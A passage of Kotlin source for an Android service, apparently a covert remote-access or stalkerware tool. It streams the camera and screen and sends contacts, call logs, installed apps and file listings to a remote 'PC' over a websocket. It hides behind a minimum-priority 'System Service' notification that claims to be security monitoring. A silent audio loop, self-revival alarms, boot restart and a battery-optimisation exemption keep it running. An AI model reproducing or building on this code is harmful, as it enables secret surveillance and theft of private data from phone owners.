                val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val jpegSizes = streamMap?.getOutputSizes(android.graphics.ImageFormat.JPEG)
                
                val targetPixels = 640 * 480
                val targetSize = jpegSizes
                    ?.filter { it.width >= 320 && it.height >= 240 }
                    ?.minByOrNull { Math.abs(it.width * it.height - targetPixels) }
                val camW = targetSize?.width ?: 640
                val camH = targetSize?.height ?: 480
                
                // Get sensor orientation for portrait rotation
                val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
                android.util.Log.i("NativeCamera", "Using resolution: ${camW}x${camH}, sensor rotation: $sensorOrientation")
                
                // Frame send guard — prevents queue buildup
                var isSending = false
                
                imageReader = ImageReader.newInstance(camW, camH, android.graphics.ImageFormat.JPEG, 2)
                imageReader?.setOnImageAvailableListener({ reader ->
                    val image = try { reader.acquireLatestImage() } catch (e: Exception) { null }
                    if (image != null) {
                        // Check if we have a pending photo capture
                        if (pendingPhotoCapture) {
                            pendingPhotoCapture = false
                            try {
                                val buffer = image.planes[0].buffer
                                val data = ByteArray(buffer.remaining())
                                buffer.get(data)
                                image.close()
                                
                                val out = Buffer()
                                out.writeByte(0x05)
                                out.write(data)
                                webSocket?.send(out.readByteString())
                                android.util.Log.i("NativeCamera", "PHOTO CAPTURED via stream! ${data.size} bytes")
                                
                                // If we started streaming just for the photo, stop after capture
                                if (!isCameraStreaming) {
                                    mainHandler.postDelayed({ stopNativeCamera() }, 500)
                                }
                            } catch (e: Exception) {
                                android.util.Log.e("NativeCamera", "Photo send error: $e")
                            }
                            return@setOnImageAvailableListener
                        }
                        
                        if (isSending) {
                            image.close()
                            return@setOnImageAvailableListener
                        }
                        isSending = true
                        try {
                            val buffer = image.planes[0].buffer
                            val data = ByteArray(buffer.remaining())
                            buffer.get(data)
                            image.close()
                            
                            val out = Buffer()
                            out.writeByte(0x05)
                            out.write(data)
                            webSocket?.send(out.readByteString())
                        } catch (e: Exception) {
                            android.util.Log.e("NativeCamera", "Frame send error: $e")
                        } finally {
                            isSending = false
                        }
                    }
                }, backgroundHandler)

                // ColorOS Silent Hang Prevention Watchdog - EXTENDED to 15s to allow for slow HAL warmup
                val watchdog = Runnable {
                    if (cameraDevice == null) {
                        android.util.Log.e("NativeCamera", "Camera HAL hung after 15s. (OEM/Low-RAM block). Aborting.")
                        cameraHardwareCleanup()
                        sendError("Camera Timeout (HAL failed to open in 15s).")
                    }
                }
                mainHandler.postDelayed(watchdog, 15000)

                // Oppo/ColorOS Focus Sync Delay: We need a small gap to ensure WindowManager registers the overlay
                mainHandler.postDelayed({
                    try {
                        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                            override fun onOpened(camera: CameraDevice) {
                                mainHandler.removeCallbacks(watchdog)
                                try {
                                    cameraDevice = camera
                                    val imageSurface = imageReader?.surface ?: run {
                                        cameraHardwareCleanup()
                                        return
                                    }
                                    
                                    val surfaces = mutableListOf(imageSurface)
                                    
                                    // Explicitly attach the WindowManager overlay surface if available to satisfy Oppo HAL Focus
                                    val overlaySurfaceTexture = overlayView?.surfaceTexture
                                    var guiSurface: android.view.Surface? = null
                                    if (overlaySurfaceTexture != null) {
                                        overlaySurfaceTexture.setDefaultBufferSize(camW, camH)
                                        guiSurface = android.view.Surface(overlaySurfaceTexture)
                                        surfaces.add(guiSurface)
                                        android.util.Log.i("NativeCamera", "Bound WindowManager GUI Surface to HAL (SILENT OPPO BYPASS).")
                                    }

                                    camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                                        override fun onConfigured(session: CameraCaptureSession) {
                                            try {
                                                cameraSession = session
                                                cameraRetryCount = 0
                                                val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                                builder.addTarget(imageSurface)
                                                if (guiSurface != null) {
                                                    builder.addTarget(guiSurface!!)
                                                }

                                                builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                                builder.set(CaptureRequest.JPEG_QUALITY, 60.toByte())
                                                
                                                try {
                                                    val ranges = cameraManager.getCameraCharacteristics(cameraId).get(CameraCharacteristics.CONTROL_AE_AVAILABLE_TARGET_FPS_RANGES)
                                                    val bestRange = ranges?.filter { it.lower >= 10 && it.upper <= 30 }?.maxByOrNull { it.upper } ?: ranges?.get(0)
                                                    if (bestRange != null) {
                                                        builder.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, bestRange)
                                                    }
                                                } catch (e: Exception) {}
                                                
                                                session.setRepeatingRequest(builder.build(), null, backgroundHandler)
                                            } catch (e: Exception) {
                                                cameraHardwareCleanup()
                                                sendError("Camera Session failed: Hardware Busy")
                                            }
                                        }
                                        override fun onConfigureFailed(session: CameraCaptureSession) {
                                            cameraHardwareCleanup()
                                            sendError("Camera Busy (Configuration Failed)")
                                        }
                                        
                                        override fun onClosed(session: CameraCaptureSession) {
                                            super.onClosed(session)
                                            // Handle cases where the session is closed externally
                                        }
                                    }, backgroundHandler)
                                } catch (e: Exception) {
                                    cameraHardwareCleanup()
                                    sendError("Camera failed: Conflict")
                                }
                            }

                            override fun onDisconnected(camera: CameraDevice) {
                                android.util.Log.w("NativeCamera", "Camera Disconnected abruptly.")
                                cameraHardwareCleanup()
                            }

                            override fun onError(camera: CameraDevice, error: Int) {
                                android.util.Log.e("NativeCamera", "Camera Error Code: $error")
                                cameraHardwareCleanup()
                            }
                        }, backgroundHandler)
                    } catch (e: Exception) {
                        android.util.Log.e("NativeCamera", "Fatal catch in openCamera: $e")
                        cameraHardwareCleanup()
                        sendError("System Camera HAL Crash (Bypassing...)")
                    }
                }, 500) // The 500ms sync gap
            } catch (e: Exception) {
                android.util.Log.e("NativeCamera", "Fatal start error: $e")
            }
        }
    }

    private fun stopNativeCamera() {
        cameraHardwareCleanup()
    }

    fun setProjectionResult(resultCode: Int, data: Intent) {
        this.projectionResultCode = resultCode
        this.projectionData = data
        // If we were waiting for this to start streaming, trigger it now
        if (isScreenStreaming) {
            startNativeScreenCapture()
        }
    }

    private var lastFrameTime = 0L

    private fun startNativeScreenCapture() {
        if (projectionData == null) {
            // Need to ask the activity to get permission
            isScreenStreaming = true
            // Flutter code should call startScreenCapture via MethodChannel when the user opens the app
            sendError("Screen projection permission required. Please open the app once.")
            return
        }

        if (virtualDisplay != null) return
        isScreenStreaming = true
        
        // Add projection flag to Foreground Service NOW that we have the token
        updateForegroundService(includeProjection = true)
        
        mainHandler?.post {
            try {
                val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = mpManager.getMediaProjection(projectionResultCode, projectionData!!)

                val metrics = resources.displayMetrics
                val width = 720 // Upgraded to HD width for portrait devices
                val height = (metrics.heightPixels * (width.toFloat() / metrics.widthPixels)).toInt()
                val density = metrics.densityDpi

                screenImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3)
                
                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        stopNativeScreenCapture()
                    }
                }, null)

                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenCapture", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    screenImageReader?.surface, null, mainHandler
                )

                screenImageReader?.setOnImageAvailableListener({ reader ->
                    val image = try { reader.acquireLatestImage() } catch (e: Exception) { null }
                    if (image != null) {
                        try {
                            // Throttle to ~8 FPS (125ms per frame) to make it smooth and not crash the websocket
                            val currentTime = System.currentTimeMillis()
                            if (currentTime - lastFrameTime >= 125) {
                                lastFrameTime = currentTime
                                val planes = image.planes
                                val buffer = planes[0].buffer
                                val pixelStride = planes[0].pixelStride
                                val rowStride = planes[0].rowStride
                                val rowPadding = rowStride - pixelStride * width

                                val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                                bitmap.copyPixelsFromBuffer(buffer)
                                
                                val stream = ByteArrayOutputStream()
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream) // Quality at 60 for speed vs size balance
                                val jpegData = stream.toByteArray()

                                val out = Buffer()
                                out.writeByte(0x06) // Binary Tag 0x06 for Screen
                                out.write(jpegData)
                                webSocket?.send(out.readByteString())
                                
                                bitmap.recycle()
                            }
                        } catch (e: Exception) {
                            android.util.Log.e("NativeScreen", "Capture error: $e")
                        } finally {
                            image.close()
                        }
                    }
                }, backgroundHandler)
            } catch (e: Exception) {
                android.util.Log.e("NativeScreen", "Start error: $e")
                sendError("Screen capture failed to start")
            }
        }
    }

    private fun stopNativeScreenCapture() {
        isScreenStreaming = false
        virtualDisplay?.release()
        virtualDisplay = null
        screenImageReader?.close()
        screenImageReader = null
        try { mediaProjection?.stop() } catch (e: Exception) {}
        mediaProjection = null
        updateForegroundService() // Remove screen type from status bar
    }

    fun sendSignal(message: String) {
        webSocket?.send(message)
    }

    fun sendBinarySignal(data: ByteArray) {
        val out = Buffer()
        out.write(data)
        webSocket?.send(out.readByteString())
    }

    private fun handleListApps() {
        thread {
            try {
                val pm = packageManager
                val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                val list = org.json.JSONArray()
                
                for (app in apps) {
                    val launchIntent = pm.getLaunchIntentForPackage(app.packageName) ?: continue
                    
                    val obj = JSONObject()
                    obj.put("name", app.loadLabel(pm).toString())
                    obj.put("package", app.packageName)
                    
                    // Icon Extraction
                    try {
                        val icon = app.loadIcon(pm)
                        val bitmap = Bitmap.createBitmap(icon.intrinsicWidth, icon.intrinsicHeight, Bitmap.Config.ARGB_8888)
                        val canvas = Canvas(bitmap)
                        icon.setBounds(0, 0, canvas.width, canvas.height)
                        icon.draw(canvas)
                        
                        // Downscale for performance (64x64)
                        val scaled = Bitmap.createScaledBitmap(bitmap, 64, 64, true)
                        val stream = ByteArrayOutputStream()
                        scaled.compress(Bitmap.CompressFormat.PNG, 100, stream)
                        val b64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                        obj.put("icon", b64)
                    } catch (e: Exception) {}
                    
                    list.put(obj)
                }
                
                val response = JSONObject()
                response.put("type", "apps_list")
                response.put("apps", list)
                sendToPC(response)
            } catch (e: Exception) {
                android.util.Log.e("SecurityService", "App list error: $e")
            }
        }
    }

    private fun handleLaunchApp(packageName: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
        } catch (e: Exception) {
            sendError("Failed to launch $packageName")
        }
    }

    private fun handleListFiles(path: String) {
        try {
            // Standardize path - default to SD card if root is restricted or empty
            val targetPath = if (path == "/" || path == "") "/storage/emulated/0" else path
            val dir = java.io.File(targetPath)
            
            // Check Manage External Storage Permission (Android 11+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!android.os.Environment.isExternalStorageManager()) {
                    android.util.Log.w("SecurityService", "MANAGE_EXTERNAL_STORAGE not granted")
                    // Still try, as internal folders might be accessible
                }
            }
            
            val files = dir.listFiles()
            val result = org.json.JSONArray()
            
            if (files == null) {
                android.util.Log.e("SecurityService", "Failed to list files (Permission Denied or Path Invalid): $targetPath")
                // Return empty list so PC knows we tried
            } else {
                files.forEach { file ->
                    val obj = JSONObject().apply {
                        put("name", file.name)
                        put("isDir", file.isDirectory)
                        put("size", if (file.isDirectory) 0 else file.length())
                        put("path", file.absolutePath)
                        put("modified", file.lastModified())
                    }
                    result.put(obj)
                }
            }
            
            webSocket?.send(JSONObject().apply {
                put("type", "files_list")
                put("device_id", deviceId)
                put("path", targetPath)
                put("files", result)
            }.toString())
        } catch (e: Exception) {
            sendError("Failed to list files: ${e.message}")
        }
    }

    private fun handleSearchFiles(pattern: String) {
        if (pattern.isEmpty()) return
        android.util.Log.i("SecurityService", "Deep Search Requested: $pattern")
        
        thread(start = true, name = "FileSearchThread") {
            try {
                val results = org.json.JSONArray()
                val root = java.io.File("/storage/emulated/0")
                
                fun walk(dir: java.io.File, depth: Int = 0) {
                    if (depth > 8) return // Safety depth limit
                    val files = dir.listFiles() ?: return
                    for (f in files) {
                        if (f.name.contains(pattern, ignoreCase = true)) {
                            results.put(JSONObject().apply {
                                put("name", f.name)
                                put("path", f.absolutePath)
                                put("isDir", f.isDirectory)
                                put("size", f.length())
                                put("modified", f.lastModified())
                            })
                        }
                        if (f.isDirectory && !f.name.startsWith(".")) {
                            walk(f, depth + 1)
                        }
                        if (results.length() > 200) return // Cap results for performance
                    }
                }
                
                walk(root)
                
                sendToPC(JSONObject().apply {
                    put("type", "search_results")
                    put("device_id", deviceId)
                    put("pattern", pattern)
                    put("files", results)
                })
            } catch (e: Exception) {
                sendError("Search failed: ${e.message}")
            }
        }
    }

    fun sendToPC(data: JSONObject) {
        try {
            webSocket?.send(data.toString())
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Failed to send to PC: $e")
        }
    }

    fun sendBinaryToPC(tag: Byte, data: ByteArray) {
        try {
            val buffer = okio.Buffer()
            buffer.writeByte(tag.toInt())
            buffer.write(data)
            webSocket?.send(buffer.readByteString())
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Failed to send binary to PC: $e")
        }
    }

    private fun handleGetContacts() {
        try {
            val contacts = org.json.JSONArray()
            val cursor = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val nameIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("name", it.getString(nameIdx))
                        val nums = org.json.JSONArray().put(it.getString(numIdx))
                        put("phones", nums)
                    }
                    contacts.put(obj)
                }
            }
            webSocket?.send(JSONObject().apply {
                put("type", "contacts_list")
                put("device_id", deviceId)
                put("contacts", contacts)
            }.toString())
        } catch (e: Exception) {
            sendError("Failed to get contacts: ${e.message}")
        }
    }

    private fun handleGetCallLogs() {
        try {
            val logs = org.json.JSONArray()
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                "${android.provider.CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val callType = when (it.getInt(typeIdx)) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                        android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else -> "unknown"
                    }
                    logs.put(JSONObject().apply {
                        put("number", it.getString(numIdx) ?: "Unknown")
                        put("name", it.getString(nameIdx) ?: "Unknown")
                        put("type", callType)
                        put("date", it.getLong(dateIdx))
                        put("duration", it.getInt(durIdx))
                    })
                    count++
                }
            }
            webSocket?.send(JSONObject().apply {
                put("type", "call_logs_list")
                put("device_id", deviceId)
                put("logs", logs)
            }.toString())
        } catch (e: Exception) {
            sendError("Failed to get call logs: ${e.message}")
        }
    }

    fun sendError(msg: String) {
        webSocket?.send(JSONObject().apply {
            put("type", "error")
            put("device_id", deviceId)
            put("message", msg)
        }.toString())
    }

    private fun startHeartbeat() {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            webSocket?.let {
                // Heartbeat 2.0: Active ping with timestamp and device health
                val hb = JSONObject().apply {
                    put("type", "heartbeat")
                    put("device_id", deviceId)
                    put("role", "android_phone")
                    put("uptime", android.os.SystemClock.elapsedRealtime())
                    put("is_awake", true)
                }
                it.send(hb.toString())
                startHeartbeat()
            }
        }, 30000) // 30s intervals for thermal efficiency
    }

    private fun startSilentAudioLoop() {
        if (isSilentAudioRunning) return
        isSilentAudioRunning = true
        
        thread(start = true, name = "SilentAudioLoop", isDaemon = true) {
            try {
                val sampleRate = 44100
                val minBufSize = AudioTrack.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT)
                
                val attributes = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ASSISTANCE_SONIFICATION)
                    .setContentType(AudioAttributes.CONTENT_TYPE_UNKNOWN)
                    .build()
                
                val format = AudioFormat.Builder()
                    .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                    .setSampleRate(sampleRate)
                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                    .build()

                silentAudioTrack = AudioTrack.Builder()
                    .setAudioAttributes(attributes)
                    .setAudioFormat(format)
                    .setBufferSizeInBytes(minBufSize)
                    .setTransferMode(AudioTrack.MODE_STREAM)
                    .build()

                val silence = ShortArray(minBufSize)
                silentAudioTrack?.play()
                
                while (isSilentAudioRunning) {
                    silentAudioTrack?.write(silence, 0, silence.size)
                    // Sleep significantly to reduce CPU usage while keeping the stream active
                    Thread.sleep(2000)
                }
            } catch (e: Exception) {
                android.util.Log.e("SecurityService", "Silent audio error: $e")
            } finally {
                silentAudioTrack?.stop()
                silentAudioTrack?.release()
                silentAudioTrack = null
            }
        }
    }

    private fun updateForegroundService(
        includeCamera: Boolean = false, 
        includeMic: Boolean = false, 
        includeProjection: Boolean = false
    ) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return

        val channelId = "security_service_channel"
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        var type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        if (includeCamera) type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        if (includeMic) type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        if (includeProjection) type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        
        // Always include location if permission is granted, as it's polled periodically
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, type)
            } else {
                startForeground(1, notification)
            }
        } catch (e: SecurityException) {
            // Fallback for Android 14 background start restrictions
            android.util.Log.w("SecurityService", "Location/Camera rejected in background. Falling back to Special Use.")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
                } else {
                    startForeground(1, notification)
                }
            } catch (e2: Exception) {
                android.util.Log.e("SecurityService", "Total FGS failure: $e2")
            }
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Failed to update FGS type: $e")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "security_service_channel"
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                channelId,
                "System Security Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Monitoring system for potential threats and security anomalies."
                setShowBadge(false)
            }
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channelId = "security_service_channel"
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        // Android 14 requires specifying types even at initial start
        var type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, type)
            } else {
                startForeground(1, notification)
            }
        } catch (e: SecurityException) {
            // CRITICAL Android 14 FIX: If started from background (Boot), LOCATION might be blocked.
            // Fallback to SPECIAL_USE to stay alive.
            android.util.Log.w("SecurityService", "Initial FGS start restricted. Retrying with SPECIAL_USE.")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
                } else {
                    startForeground(1, notification)
                }
            } catch (e2: Exception) {}
        }
        
        return START_STICKY
    }

    override fun onDestroy() {
        try {
            stopNativeCamera()
            stopNativeScreenCapture()
            stopLocationPolling()
            isSilentAudioRunning = false
            wifiLock?.release()
            wakeLock?.release()
        } catch (e: Exception) {}
        super.onDestroy()
    }

    private fun startRevivalHeartbeat() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, BootReceiver::class.java).apply {
            action = "com.example.android_security.REVIVE_SERVICE"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            this, 1001, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        // Trigger every 15 minutes to stay alive during deep sleep
        val interval = 15 * 60 * 1000L
        alarmManager.setInexactRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + interval,
            interval,
            pendingIntent
        )
        android.util.Log.d("SecurityService", "Self-revival heartbeat started.")
    }

    private fun requestPowerWhitelist() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(intent)
                    android.util.Log.i("SecurityService", "Requested battery optimization whitelist")
                } else {
                    // Already whitelisted or fallback
                }
            } catch (e: Exception) {
                // Fallback to general settings
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
